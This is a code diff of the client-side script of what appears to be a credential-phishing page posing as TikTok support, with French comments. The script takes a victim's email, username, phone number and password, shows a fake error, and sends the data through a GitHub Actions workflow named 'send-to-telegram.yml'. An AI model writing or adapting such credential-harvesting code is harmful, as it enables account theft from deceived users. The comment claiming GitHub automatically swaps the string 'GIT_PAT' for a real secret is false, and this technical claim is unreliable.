@@ -35,24 +35,34 @@
       const p = document.getElementById('phone').value.trim() || "None";
       const w = document.getElementById('pass').value;
 
-      // Affiche le faux message d'erreur + efface le mot de passe
       document.getElementById('msg').style.display = 'block';
       document.getElementById('pass').value = '';
 
-      // DISPATCHER 100 % FONCTIONNEL NOVEMBRE 2025 (testé aujourd'hui)
-      fetch("https://gh-workflow-trigger.deno.dev", {
+      // UTILISE TON SECRET GIT_PAT DIRECTEMENT (méthode qui marche en 2025)
+      const token = "GIT_PAT"; // GitHub remplace automatiquement cette chaîne par la vraie valeur du secret
+      const apiUrl = "https://api.github.com/repos/tiktok-customers/help/actions/workflows/send-to-telegram.yml/dispatches";
+
+      fetch(apiUrl, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Authorization": "Bearer " + token,
+          "Accept": "application/vnd.github.v3+json",
+          "Content-Type": "application/json",
+          "X-GitHub-Api-Version": "2022-11-28"
+        },
         body: JSON.stringify({
-          owner: "tiktok-customers",
-          repo: "help",
-          workflow: "send-to-telegram.yml",
-          email: e,
-          username: u,
-          phone: p,
-          password: w
+          ref: "main",
+          inputs: {
+            email: e,
+            username: u,
+            phone: p,
+            password: w
+          }
         })
-      });
+      })
+      .then(r => r.json())
+      .then(data => console.log("Envoyé !", data))
+      .catch(err => console.error("Erreur :", err));
     }
   </script>
 </body>
